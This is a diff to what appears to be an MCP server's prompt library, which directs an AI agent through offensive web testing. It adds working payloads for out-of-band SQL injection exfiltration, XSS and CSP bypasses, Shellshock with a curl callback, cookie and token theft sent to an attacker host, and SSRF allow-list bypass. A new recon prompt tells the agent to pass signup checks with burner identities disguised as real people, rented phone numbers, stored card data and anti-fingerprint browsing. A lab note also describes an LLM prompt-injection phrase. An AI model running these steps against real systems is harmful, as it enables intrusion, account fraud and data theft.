@@ -123,7 +123,17 @@ If basic payloads are blocked:
 If a login form is the target:
 1. \`sqli_login_bypass("${target_url}")\` — Test comment truncation.
 2. Payloads: \`admin'-- -\`, \`' OR 1=1-- -\`, \`' OR '1'='1\`, \`admin' AND '1'='1\`
-3. For JSON-based logins, test operator injection too — see nosqli_methodology.`,
+3. For JSON-based logins, test operator injection too — see nosqli_methodology.
+
+## Step 8: OOB Extraction via Interactsh
+When blind injection is confirmed but time-based extraction is too slow or unreliable:
+1. Start an interactsh listener: \`oob_start_listener\`
+2. Generate OOB payloads per database type with \`oob_generate_payload("sqli")\`
+3. Oracle: \`UTL_HTTP.REQUEST\`, \`UTL_INADDR.GET_HOST_ADDRESS\`, \`DBMS_LDAP.INIT\`
+4. MSSQL: \`xp_dirtree '\\\\\\\\{OAST}\\\\a'\`, \`master..xp_subdirs\`
+5. MySQL: \`LOAD_FILE('\\\\\\\\\\\\\\\\{OAST}\\\\\\\\a')\`
+6. PostgreSQL: \`COPY ... TO PROGRAM 'curl {OAST}'\`
+7. Poll results with \`oob_poll_interactions\` — DNS subdomain or HTTP path contains exfiltrated data.`,
           },
         },
       ],
@@ -277,7 +287,28 @@ If XSS steals a session cookie in base64:md5 format (e.g., \`dXNlcjpNRDVIQVNI\`)
 2. Crack the MD5 offline with hashcat: \`hashcat -m 0 hash.txt rockyou.txt\`
 3. Use the cracked password to log in directly.
 
-## Step 10: Impact Demonstration
+## Step 10: SVG Animate Bypass (When Event Handlers + href Blocked)
+If the WAF blocks all event handler attributes AND \`href\`:
+\`\`\`
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
+\`\`\`
+The \`<animate>\` element dynamically sets \`href\` on the parent \`<a>\` at render time, bypassing static attribute blocking. Requires user click.
+
+## Step 11: CSP Bypass via Policy Injection
+If reflected input appears inside a \`Content-Security-Policy\` header (e.g., a token parameter):
+\`\`\`
+token=;script-src-elem 'unsafe-inline'
+\`\`\`
+Inject \`script-src-elem 'unsafe-inline'\` to override the restrictive \`script-src\` policy. CSP parsing: the last directive wins when duplicated. Then inject inline scripts normally.
+
+## Step 12: DOM Clobbering
+If the page reads global variables that may be undefined (e.g., \`window.defaultAvatar\`):
+\`\`\`html
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+\`\`\`
+Two anchors with the same \`id\` create an HTMLCollection. Accessing \`collection.property\` returns the anchor with matching \`name\`. The \`href\` value breaks out of the attribute context via \`cid:"\` and triggers XSS.
+
+## Step 13: Impact Demonstration
 For confirmed XSS, prove maximum impact:
 - Cookie theft: \`document.location='https://attacker/steal?c='+document.cookie\`
 - Token theft from localStorage: \`fetch('https://attacker/steal?t='+localStorage.getItem('token'))\`
@@ -305,6 +336,33 @@ For confirmed XSS, prove maximum impact:
             text: `# Web Application Penetration Test Methodology
 
 **Target:** ${target}
+
+## Phase 0: Authenticated Reconnaissance (MANDATORY)
+
+**This phase is MANDATORY. DO NOT skip it. DO NOT proceed to attack phases with only unauthenticated access.**
+
+Most critical vulnerabilities — IDOR, privilege escalation, business logic flaws, CSRF on state-changing actions, broken access control — are invisible without an authenticated session.
+
+1. Check Bitwarden for existing credentials for ${target}
+2. If none exist: create an account using the authenticated_recon_methodology
+   - Use burner identity from Bitwarden
+   - Handle verification gates (email, phone via TextVerified, payment walls)
+   - Enable TOTP 2FA and store in Bitwarden SecurityTesting folder
+3. Login and harvest the session:
+   - Extract all cookies, localStorage tokens, sessionStorage tokens, Authorization headers
+   - Save session bundle to {target-domain}-session.json
+4. Map authenticated endpoints:
+   - Crawl all dashboard sections with network interception
+   - Record every API endpoint, method, parameters, and auth requirements
+   - Save endpoint map to {target-domain}-endpoints.json
+5. Pass the session bundle to all subsequent attack phases
+
+**If signup is impossible** (invitation-only, geo-blocked, requires real org credentials):
+- Report to user: "DEGRADED MODE: Running unauthenticated-only. Coverage is significantly reduced."
+- Proceed with unauthenticated testing only
+- Flag in the final report that authenticated testing was not performed
+
+Consult the signup_patterns_cheatsheet resource for Bitwarden CLI, TextVerified API, and session harvesting reference.
 
 ## Phase 1: Reconnaissance
 1. Run \`recon_quick("${target}")\` — robots.txt, security.txt, headers, common directories.
@@ -359,6 +417,7 @@ For confirmed XSS, prove maximum impact:
     - \`path_traversal_test\` for directory traversal.
     - **Lab reference (Null byte bypass):** When the server validates file extensions, inject %00 before a valid extension (e.g., \`../../../etc/passwd%00.jpg\`) to bypass validation on older PHP/C systems where null byte terminates the string.
     - **Lab reference (NoSQL field enumeration):** Use \`$where\` with \`Object.keys(this)[N]\` to enumerate MongoDB document fields, then extract values character-by-character via \`.match('^pattern')\`.
+    - **Blind injection via OOB:** For blind injection without visible output, use \`oob_start_listener\` + \`oob_generate_payload\`. Inject interactsh URLs into SQLi (UTL_HTTP, xp_dirtree, LOAD_FILE, COPY TO PROGRAM), CMDi (nslookup, curl), and XXE payloads. Poll with \`oob_poll_interactions\` to confirm exploitation and exfiltrate data via DNS subdomain or HTTP path callbacks.
 
 ## Phase 6: SSTI Testing
 21. For each parameter that renders in a template:
@@ -378,6 +437,7 @@ For confirmed XSS, prove maximum impact:
     - **Lab reference (Blind XXE via error messages):** Host external DTD with parameter entity chaining to exfiltrate file contents in error messages.
     - **Lab reference (Blind XXE OOB exfiltration):** Use external DTD with \`%file\`→\`%eval\`→\`%exfil\` parameter entity chain for out-of-band data exfiltration; target file must be single-line to avoid URL-breaking newlines.
     - **Lab reference (XXE via SVG upload):** Upload SVG with DOCTYPE/entity declaration to image upload endpoints; server-side image processing resolves XXE entities and renders file content in the output image.
+    - **Blind SSRF:** For blind SSRF, inject interactsh URLs (\`oob_start_listener\` + \`oob_generate_payload\`). For Shellshock on internal hosts: \`User-Agent: () { :;}; curl {OAST}/$(whoami)\` + \`Referer: http://192.168.0.X:8080/cgi-bin/status\`. Poll with \`oob_poll_interactions\`.
 23b. **HTTP Request Smuggling:** Test for CL/TE disagreement between front-end proxy and back-end:
     - **Lab reference (CL.TE basic):** Front-end uses Content-Length, back-end uses Transfer-Encoding — smuggle \`G\` prefix with CL:6 + chunked \`0\\r\\n\\r\\n\`; next request becomes \`GPOST\` (unrecognized method confirms vuln).
     - **Lab reference (TE.CL basic):** Front-end uses chunked, back-end uses Content-Length — smuggle a full \`GPOST\` request inside a chunk that exceeds the back-end's CL.
@@ -385,6 +445,7 @@ For confirmed XSS, prove maximum impact:
     - **Lab reference (CL.TE differential):** Confirm CL.TE by smuggling a \`GET /404-path\` prefix — if the next legitimate request returns 404, smuggling is confirmed.
     - **Lab reference (TE.CL differential):** Same differential technique for TE.CL — smuggle a 404-triggering request inside a chunk.
     - **Lab reference (CL.0 smuggling):** Back-end ignores Content-Length on static paths (e.g., \`/resources/\`) — POST to a static path with a smuggled admin request in the body; back-end reads zero-length body and processes the remainder as a new request.
+    - **Advanced smuggling:** Use \`raw_http_send\` for CL.TE/TE.CL attacks with exact byte control. Use \`raw_h2_smuggle\` for H2 CRLF injection, H2.CL, and H2.TE attacks. Use \`raw_connection_reuse\` for Host header connection state attacks. Reference \`http_smuggling_cheatsheet\` resource for full technique catalog including 0.CL, client-side desync, and pause-based smuggling.
 
 ## Phase 8: Access Control & Business Logic
 23. Run \`idor_test\` on any endpoints with ID parameters.
@@ -394,7 +455,7 @@ For confirmed XSS, prove maximum impact:
 27. Test workflow bypass: Can you skip steps in multi-step processes by directly requesting later steps?
     - **Lab reference (Infinite money):** Check for gift card arbitrage via coupon discount cycles (buy discounted, redeem at full value).
     - **Lab reference (Encryption oracle):** Test if the same encryption key is shared across different cookies (e.g., notification and auth); block cipher ciphertext manipulation can forge auth cookies.
-28. Race condition testing — use HTTP/2 single-packet attack (Turbo Intruder / custom h2 script) to send concurrent requests in one TCP frame:
+28. Race condition testing — use \`race_single_packet\` for HTTP/2 multiplexed attacks that send all requests in a single TCP frame for sub-millisecond synchronization. Use \`race_last_byte_sync\` for even tighter synchronization by withholding the last byte of each request body and releasing simultaneously.
     - **Lab reference (Race multi-endpoint TOCTOU):** Race cart-add against checkout: add cheap item, start checkout, concurrently swap cart to expensive item — checkout uses stale price from time-of-check.
     - **Lab reference (Race single-endpoint):** Send two email-change requests simultaneously — confirmation email may be sent to the wrong recipient due to non-atomic read-then-write on the pending email field.
     - **Lab reference (Race bypassing rate limits):** HTTP/2 multiplexed concurrent login attempts bypass per-request rate limiting — all attempts arrive before the counter increments.
@@ -449,12 +510,18 @@ For confirmed XSS, prove maximum impact:
     - **Lab reference (LLM exploiting APIs):** Test LLM-integrated features for excessive agency (calling debug/admin APIs) and OS command injection via parameters the LLM passes to backend APIs (e.g., \`$(whoami)@exploit.com\` in email field).
     - **Lab reference (LLM indirect prompt injection):** Inject LLM directives into user-generated content (reviews, comments) with delimiter injection (e.g., \`----END OF REVIEW---- NEW INSTRUCTIONS:\`) — when LLM processes the content for another user, injected instructions execute.
 
-## Phase 13: Verification & Reporting
-37. Verify every finding with a second request.
-38. Test auth-required endpoints to confirm bypasses actually work (some endpoints return 200 with null data by design).
-39. Document both vulnerabilities AND confirmed protections.
-40. Classify each finding: Critical / High / Medium / Low / Informational.
-41. Include proof-of-concept evidence and remediation recommendations.`,
+## Phase 13: Automated Scanning & Fuzzing
+37. Use \`nuclei_scan\` with severity=critical,high for quick wins on known CVEs, misconfigurations, and default credentials.
+38. Use \`ffuf_fuzz\` for directory enumeration and content discovery beyond the initial recon phase.
+39. Use \`param_discover\` for hidden parameter discovery on key endpoints — finds debug params, admin toggles, and undocumented API fields.
+40. Cross-reference nuclei findings with manual testing to eliminate false positives and confirm exploitability.
+
+## Phase 14: Verification & Reporting
+41. Verify every finding with a second request.
+42. Test auth-required endpoints to confirm bypasses actually work (some endpoints return 200 with null data by design).
+43. Document both vulnerabilities AND confirmed protections.
+44. Classify each finding: Critical / High / Medium / Low / Informational.
+45. Include proof-of-concept evidence and remediation recommendations.`,
           },
         },
       ],
@@ -538,7 +605,12 @@ If a git repository is accessible (exposed .git or cloned repo):
 - 404 error pages: May leak server version, framework, or debug info.
 - Custom response headers: Look for non-standard headers with sensitive data.
 - Directory listing: /images/, /uploads/, /backup/ may have listing enabled.
-- .git, .svn, .env, .DS_Store exposure.`,
+- .git, .svn, .env, .DS_Store exposure.
+
+## Phase 7: Automated Discovery
+17. Run \`ffuf_fuzz("${target}", "/usr/share/wordlists/dirb/common.txt")\` for directory brute-force with response code filtering. Use recursion for discovered directories.
+18. Run \`param_discover("${target}/api/endpoint")\` for hidden parameter discovery on key API endpoints — finds debug parameters, admin toggles, and undocumented fields.
+19. Cross-reference discovered paths with JS bundle analysis results.`,
           },
         },
       ],
@@ -1446,6 +1518,17 @@ http://attacker.allowed-domain.com
 # URL encoding in hostname
 http://allowed-domain%252F@attacker.com
 \`\`\`
+
+### Double URL-encoding # with @ credentials (whitelist bypass)
+\`\`\`
+# Double-encode # as %2523 to confuse URL parsers
+http://allowed-host%2523@127.0.0.1/admin
+
+# Decoding chain: %2523 -> %23 (first decode) -> # (second decode)
+# Allow list sees "allowed-host" in URL and passes
+# Back-end fetcher resolves to 127.0.0.1/admin after double decode
+\`\`\`
+Combine \`@\` (credentials separator) + \`%2523\` (double-encoded \`#\`) + fragment injection. The allow list check passes because the allowed hostname appears in the URL, but after double URL-decoding the \`#\` turns the allowed portion into a fragment, and the actual host resolves to the attacker-controlled address (or localhost).
 
 ## Step 4: Open Redirect Chaining
 If the target has an open redirect on the allowed domain, chain it:
@@ -2963,6 +3046,129 @@ Severity guide:
 2. Authenticate as a test user in the browser.
 3. Visit the exploit page — confirm the API response is captured.
 4. Document exactly which Origin values are trusted and whether credentials are included.`,
+          },
+        },
+      ],
+    })
+  );
+
+  // ---------------------------------------------------------------------------
+  // 23. authenticated_recon_methodology
+  // ---------------------------------------------------------------------------
+  server.prompt(
+    "authenticated_recon_methodology",
+    "Full authenticated reconnaissance methodology — account creation, verification bypass, session harvesting, and endpoint mapping",
+    { target: z.string().describe("Target application URL") },
+    ({ target }) => ({
+      messages: [
+        {
+          role: "user" as const,
+          content: {
+            type: "text" as const,
+            text: `# Authenticated Reconnaissance Methodology
+
+**Target:** ${target}
+
+## Step 1: Credential Provisioning
+1. Check Bitwarden for existing credentials for the target domain.
+2. Unlock vault: \`export BW_SESSION=$(bw unlock --passwordenv BW_MASTER_PASSWORD --raw)\`
+3. Search for existing creds: \`bw list items --search "${target.replace(/^https?:\/\//, '').split('/')[0]}" --session "$BW_SESSION"\`
+4. If none found: generate a realistic burner identity (realistic names — not test/hacker identifiers).
+5. Generate a strong password: \`bw generate --length 20 --special --session "$BW_SESSION"\`
+
+## Step 2: Account Registration
+1. Navigate to the signup page on ${target}.
+2. Fill the registration form with your burner identity.
+3. Handle verification gates:
+   - **Email verification**: Access burner email inbox, find confirmation email, click the verification link.
+   - **Phone verification** via TextVerified.com API:
+     - Check available services: \`GET https://www.textverified.com/api/Targets\` with header \`X-SIMPLE-API-ACCESS-TOKEN: {api_key}\`
+     - Rent a number: \`POST https://www.textverified.com/api/Verifications\` with body \`{"id": "{service_id}"}\`
+     - Enter the rented phone number in the signup form.
+     - Poll for SMS code: \`GET https://www.textverified.com/api/Verifications/{id}\` — returns \`smsContent\` when received.
+     - Enter the verification code in the form.
+   - **Payment wall**: Use card data stored in Bitwarden for trial/free tier signup. Always check if a free tier exists first.
+   - **CAPTCHA**: Use anti-fingerprint browser. If stuck, flag to the user for manual intervention.
+   - **Invitation-only**: Stop and report to the user — cannot proceed without an invite.
+
+## Step 3: Account Hardening
+1. Navigate to security settings and enable TOTP 2FA on the target account.
+2. Extract the TOTP secret:
+   - Look for \`otpauth://\` URI in QR code \`data:\` attribute or canvas element.
+   - Or copy the text secret (usually displayed as groups of 4 characters).
+3. Generate a TOTP code to confirm setup:
+   - \`oathtool --totp -b "{secret}"\`
+   - Or: \`python3 -c "import pyotp; print(pyotp.TOTP('{secret}').now())"\`
+4. Confirm 2FA setup in the application and save any recovery codes.
+5. Store everything in Bitwarden SecurityTesting folder:
+   - Create folder: \`echo '{"name":"SecurityTesting"}' | bw encode | bw create folder --session "$BW_SESSION"\`
+   - Create item with login.totp field: \`bw create item\` (include username, password, URI, TOTP secret).
+   - Add TOTP secret and recovery codes in notes: \`bw get item {id} | jq '.login.totp = "{secret}"' | bw encode | bw edit item {id} --session "$BW_SESSION"\`
+
+## Step 4: Login & Session Harvest
+1. Login to ${target} with credentials + TOTP code from Bitwarden:
+   - Get TOTP code: \`bw get totp "{item_id}" --session "$BW_SESSION"\`
+2. Once authenticated, extract all session material:
+   - **Cookies**: All cookies for the domain (especially session, auth, CSRF cookies).
+   - **localStorage**: Scan for JWTs, access tokens, refresh tokens, API keys.
+   - **sessionStorage**: Scan for access tokens, auth tokens.
+   - **Authorization headers**: Intercept network requests to capture Bearer tokens, API keys in headers.
+3. Save session bundle as JSON:
+\`\`\`json
+{
+  "target": "${target}",
+  "cookies": [{"name": "...", "value": "...", "domain": "...", "path": "/", "httpOnly": true, "secure": true}],
+  "localStorage": {"key": "value"},
+  "sessionStorage": {"key": "value"},
+  "headers": {"Authorization": "Bearer ...", "X-CSRF-Token": "..."},
+  "csrf_token": "...",
+  "account": {"email": "...", "has_2fa": true},
+  "harvested_at": "ISO8601"
+}
+\`\`\`
+
+## Step 5: Authenticated Endpoint Discovery
+1. Crawl all authenticated app sections: dashboard, settings, profile, admin panels, billing.
+2. Intercept every network request: capture URL, method, parameters, and auth headers.
+3. Identify attack candidates in the endpoint map:
+   - **ID parameters** → IDOR candidates (e.g., \`/api/users/123\`, \`/api/orders/456\`)
+   - **State-changing endpoints** → CSRF candidates (POST/PUT/DELETE without CSRF tokens)
+   - **File upload endpoints** → Upload bypass, path traversal, malicious file execution
+   - **Admin endpoints** → Privilege escalation, horizontal/vertical access control
+   - **GraphQL endpoints** → Introspection, query depth attacks, batch queries
+   - **WebSocket connections** → Message injection, auth bypass, origin validation
+4. Output a structured endpoint map:
+\`\`\`json
+{
+  "endpoints": [
+    {"url": "/api/...", "method": "GET", "params": ["id"], "auth_type": "Bearer", "idor_candidate": true, "csrf_required": false}
+  ],
+  "websockets": ["wss://..."],
+  "graphql_endpoint": "/graphql",
+  "total_discovered": 0
+}
+\`\`\`
+
+## Step 6: Handoff
+1. Save the session bundle JSON and endpoint map to files in the working directory.
+2. Report summary: account status, 2FA status, token types found, total endpoint count.
+3. Provide session bundle format for curl-based attack agents:
+\`\`\`bash
+# Bearer token auth
+curl -H "Authorization: Bearer {token}" -H "Cookie: session={value}" ${target}/api/endpoint
+
+# Cookie-only auth
+curl -b "session=abc123; csrf=xyz789" ${target}/api/endpoint
+
+# Both + CSRF header
+curl -b "session=abc123" -H "X-CSRF-Token: xyz789" -X POST ${target}/api/settings -d '{"key":"value"}'
+\`\`\`
+
+## Step 7: Verification
+1. Verify the session is still valid — make a request to an authenticated endpoint and confirm a 200 response.
+2. Verify TOTP works — generate a fresh code with \`bw get totp "{item_id}" --session "$BW_SESSION"\` and validate it.
+3. Document any signup restrictions, rate limits, or anti-automation measures encountered during registration.
+4. Confirm the endpoint map is complete — compare discovered endpoints against visible UI navigation.`,
           },
         },
       ],
